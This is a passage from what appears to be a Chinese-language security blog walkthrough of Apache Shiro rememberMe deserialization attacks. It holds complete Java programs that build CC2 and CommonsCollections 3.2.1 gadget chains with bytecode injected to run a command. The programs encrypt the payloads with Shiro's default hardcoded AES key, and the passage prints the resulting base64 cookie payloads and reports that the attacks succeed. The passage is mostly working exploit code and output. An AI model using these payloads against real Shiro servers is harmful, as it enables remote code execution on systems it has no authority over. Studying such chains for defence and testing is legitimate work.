class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PriorityQueue <span class="hljs-title function_">gadget</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 构造TemplatesImpl对象</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (TemplatesImpl) clazz.getConstructor().newInstance();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-comment">// 构造 CC2 利用链</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(invokerTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>,comparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125; );<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化PriorityQueue对象</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(gadget());<br>        oos.close();<br>        <br>        <span class="hljs-type">byte</span>[] CC2bytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 生成一个固定的 IV（实际应用中建议随机生成并随密文一起传输）</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        javax.crypto.spec.<span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(iv);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(CC2bytes);<br>        <span class="hljs-comment">// 合并 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] newBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + encryptedBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, newBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(encryptedBytes, <span class="hljs-number">0</span>, newBytes, iv.length, encryptedBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.encodeToString(newBytes);<br>        System.out.println(encodedString);<br>        <br>         <span class="hljs-comment">/**</span><br><span class="hljs-comment">          * 模拟Shiro解密过程进行验证</span><br><span class="hljs-comment">          * */</span><br>        <br>        <span class="hljs-comment">// Base64解码</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(encodedString);<br>        <span class="hljs-comment">// 分割 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] enBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIv.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(decode,deIv.length,enBytes,<span class="hljs-number">0</span>,enBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpace</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIv);<br>        cipher.init(Cipher.DECRYPT_MODE, key, deIvSpace);<br>        <span class="hljs-type">byte</span>[] decryptedBytes = cipher.doFinal(enBytes);<br><br><br>        <span class="hljs-comment">// 反序列化验证</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decryptedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmGvHx2OvJ5ryzYS4uJR8RbZqb6c5DVsaBAnzkILt1HEKgl0/</span>wuiDxWzHw<span class="hljs-regexp">/c7O253wUyl6/</span>YB5eQZbrDzNR4BuXcmSrLAn2cMPOo<span class="hljs-regexp">/f7FBNDZ6Gx+prKFPBZD5Suu4B6baLKZ0+qkOWyjOhshG2IVWEdIStW3eCfaLnYYSx24taYZmD+n+iARz4bwtsCThedKniGYlFWRYGbFYgSbtJuzwPXR5jJcIiS5miHlpdftHO9qPESGHYxD/</span>G9HodhwPGNb<span class="hljs-regexp">/PfRo5nTOXCCUohsJKvRPKU5R2AntvueGsQE51QPqU1xwRS6AlKNqCofMvvJI1Xgm29ah2brze3mZvOC/</span>oDvDzZ1fO<span class="hljs-regexp">/yF5VN0f8fcvIkML64xr85zeCyyb+Ozj4RVgIkWrud0cfqZDkagw3Q+bL/</span>C+N7L8jVH+EJDIqzhfiLKg5hAkBaS6Gq3X<span class="hljs-regexp">/BxPT80hEX/u</span>6ke6eedzfMwwi487NVb8uZpBlmNBY+l9K5Ml5ZBWN7e8ecziiswodwu0PX12Eq+wtHpIiUt5rpyHnbV0Wyk+oHvlICeBhdEXlrGcmCDJWpN<span class="hljs-regexp">/J8uWykd/</span><span class="hljs-number">4</span>rkXi192HWTmMaUV69sfBXxgV6461QX7fFbMxY5+MNfJzo78OXxZAkFA<span class="hljs-regexp">/R+xhALT3aP6TFPJKX1kEbP8lL/</span>D39FIDw+WLHezbGJpfPbT<span class="hljs-regexp">/1KIU7dY/</span>n6wqxJpq<span class="hljs-regexp">/B/</span>FNPNKn3bcZaa8uktCgrBq67j<span class="hljs-regexp">/+cd6y1k3V2Rt8uP7sK9pUMv5D9Xk32kzC0QTHYmLAXRIffY97am6nzWhE5yqmKGAm7Nom3Wmy2i2oY5dQGg/</span>D7DNY0Q15BplVWoOUDveB9az1g9GrF8ds4VAI7ZmCPwiz<span class="hljs-regexp">/7Q5lTa3CBAH00NWkauHe/i</span>Lqnw<span class="hljs-regexp">/injiwewoL8PA3fQv3R05lFC6LodL8PfKb1aEYWv8/</span>PcRqWcM4QFkI4+VrmsHpu7D3<span class="hljs-regexp">/QthiMkQCCMS/</span>VZjmtI2irReaLS9mlSlsa+p4mV5P6segENa7A5d6A5ov9hJ1oyGL7WGkaljvpEQrvbuu6gsPR2sw26e567iZtAsOv1j46MlYiAKBFMX4fR41ARzoIS<span class="hljs-regexp">/b2fVV/</span>Bi7+MYP7S<span class="hljs-regexp">/50xS5ynfqby3rmJPYe1uIoJFZhUvwvMWCcU+vQ5rnVD6vd4KNp1ULXNeS3Wd/</span>nZRWIKrpsDxyGZ8ZhFWxJh28IPXrL4VWjfeYnXlk7VlnZq4gp3JGHCm0MTo51Fy6Dpg9AdN5qlxIAsXWD6hTYWlMiuPNuIBQmUfePCG5vJA26lTFa2nRZB3Lwggj20s6QDIQ<span class="hljs-regexp">/cOLrLzZ49KvdefCasO/</span>o1tArOpfcVE+nC3WYBrcRVAC0jrlErBTNR7IW6wBdpSD0R24O9jWzBDsCmxkNEC+cN6Jn8J7<span class="hljs-regexp">/TzcrKHjnhimpNYZkC1X0epP8Xw3wWJbQOakrzYJIF9zEWBVdldFN9CrE8nbei/</span>MM<span class="hljs-regexp">/Xiywn6LOoLHdaiDQ5LhFA221wep1ek8gvzWI0QT8g+vvz6PdgrzThNhkFHGrYYt7h59owXNAJ6drLJHmQogsx0/</span>Fge0YZdAfr8MwpUVdUiNnxNe0IaKPKK1QZhVcD9VJfBW3hKUKV6ojeHW9QKhh0AMV/<span class="hljs-number">4</span>vZFs3VkkNJOVjr8TCEKZoW5m60pB0O5YhhOHGo=<br></code></pre></td></tr></table></figure><p>可以成功执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250419165458208.png" alt="image-20250419165458208"></p><h3 id="CC3-2-1-攻击"><a href="#CC3-2-1-攻击" class="headerlink" title="CC3.2.1 攻击"></a>CC3.2.1 攻击</h3><p>需要 shiro 目标有 CommonsCollections3.2.1 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这条链子是由 CC 系列的链条拼接得到的，主要就是要去掉 Transformer [] 这个数组，实现命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC321Payload</span> &#123;<br>   <span class="hljs-comment">// 生成恶意类字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime&quot;</span> +<br>                <span class="hljs-string">&quot;.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-comment">// 反射设置字段值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-comment">// 生成恶意的Map类，作为gadget</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,invokerTransformer);<br>        lazyMap.remove(templates);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CC321bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV 随encrypt一起传输</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] enEvilbytes = cipher.doFinal(CC321bytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + enEvilbytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(enEvilbytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, enEvilbytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IVandEncryptB64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(IVandEncryptB64);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟 shiro 的解密过程，反序列化验证</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">// base64解码</span><br>        <span class="hljs-type">byte</span>[] IVandEncryptBytes = Base64.decode(IVandEncryptB64);<br>        <span class="hljs-comment">// 拆分IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] evil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IVandEncryptBytes.length - deIv.length];<br>        System.arraycopy(IVandEncryptBytes,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(IVandEncryptBytes,deIv.length,evil,<span class="hljs-number">0</span>,evil.length);<br>        cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] deEvilBytes = cipher.doFinal(evil);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvilBytes);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M</span>+uF/<span class="hljs-number">0</span>QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu/h/iBFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+<span class="hljs-number">3</span>Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h96YKRFwc+FVEtLlOyKCsf7cbvPwDlb8zQpfu9I5GlgAyBJ8HToAFRfx+Sc/sXdACA2nQail4+<span class="hljs-number">3</span>eEQ+P2avZI0VYatZ4+OJzNUiGmZPWpRvjlaBvMQ4ywEjndwP9d8Ye+tPXJoO8L9bWbXbNk46rBqlO1u4BF0GpEYqwCs88gaQWYwo/aVvajl5hdyY1vBh0/kK2R3WoQ9j4mEBHUVF9de203eoiO+DaWsxmvZkeqpAzdt1EkJ7t1uC1bswdrSmGizBnQcwNK2+<span class="hljs-number">6</span>AfRAXvq0ZRYNFWlY3o9rOEWrLX1ZKHbpqj8pJ9N8ikayN8rJwqWOElSs0hHBhEzUk5YzF5XhXpjR4ULmMThYBlQHLX+wk9VmuVQSeVXTXPJ7+vAzQLYkJvV0uJLjFno3A5rDykeW5MUUQJHUhxsrDg8OrfcX1IEx/<span class="hljs-number">3</span>QOAFIDFjDD9tlSiiGIixoeldxGhH7YRUXaBjl0Xa853SKns8fllBz2e1nPgFcJ/Yatw0Qhegy8g6uEZqZ7F8G1zF1gwPFHkdpQXKNgpWhxFZOkH/<span class="hljs-number">1</span>tXovTBZuaqbJ4syPirFodzUh/CH/<span class="hljs-number">7</span>e78Tpj0yQjCONfoBKTzkFAa1omWgVagR16OU6hiTzHbtaDvqFR1nxirVdR0H7JfD6aJ5yXpB/<span class="hljs-number">30</span>jbD4PQ6sBnNzoR5ojD/ioAWi3CIqhW2Jugl0XIiPQDLWdWwPm5A4xbgGjjZ4DoBAwNQum7zDAE/ebRDtCm8hRMLXuV8k/ol+icErvIKxn8P624MnaSbJLA6scXKEdKXpk2yvnbksKnHQQi8+KyVDDEUpOrahJDA2miMRZ/<span class="hljs-number">2</span>VfOvrdxJVfkFsEiQvgYOfetu8gFTkSFTaNMFm7i/YTbgtBbb7o73w6E54Ma+W8Q4AQxz3Fcf7QozyPYbF2vEb0sGsGi2RwzRUy1mAW2+<span class="hljs-number">01</span>ZwYt4JCIkfu6nfRVusLUr44AjuqbTuR+fkOdIu4vBwZfh0cFbhM8KrvoQP7QKl7dKPkbbfiNiQ7dd/RClsP5s7XqE87fyCD0eI5p8e1FkUIgOfJfG0wUZqYwyG17u2v94lR1eLoxxLK5L2xoB+<span class="hljs-number">6</span>QrwFbRb+ccn4Gg6356YAgXL19XXCSR//<span class="hljs-number">2</span>G+<span class="hljs-number">8</span>aiYXAcTHZ4YaD+vTdDNFhqWztTakdfyGVihkFJIZKhchjhW2nSs5sx4ZjqEOVbpwL1ycsPxmf+blgZGOkGs/jzrK17XhQTqzSMg3UCdI4N1PHFwxUW29RH2aOsL4z/<span class="hljs-number">7</span>VHQBpiBj5doFYtPNpxRfuo4HREJvMT7ApfhPiGPdla573/yooJy7iLqeg5kEYo+<span class="hljs-number">3</span>PJ0FuLHmpwAky78IH29a/dIQIOn3fSa/CrbtgwkiQPGhtuLY2js1qkMHDiveiytMVGtYgMjfe/QHhaZG0+Dtv1ivKsR9SBANl3AC0sGxiDLW3+uhoqQOvPtP1+hE9gzd+pnl1eLLZ5eZ2ptFAXlf12wDDc73PiXIVHcifLuU7B5USkOGmG/XLDwJkhSDFvNcWbw3RjcgE=<br></code></pre></td></tr></table></figure><p>可以攻击成功</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420153552612.png" alt="image-20250420153552612"></p><h3 id="CB-链攻击"><a href="#CB-链攻击" class="headerlink" title="CB 链攻击"></a>CB 链攻击</h3><p>shiro 默认是带了 commons-beanutils 依赖的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420155140387.png" alt="image-20250420155140387"></p><p>所以这条链更加通用</p><p>保证依赖版本一直</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 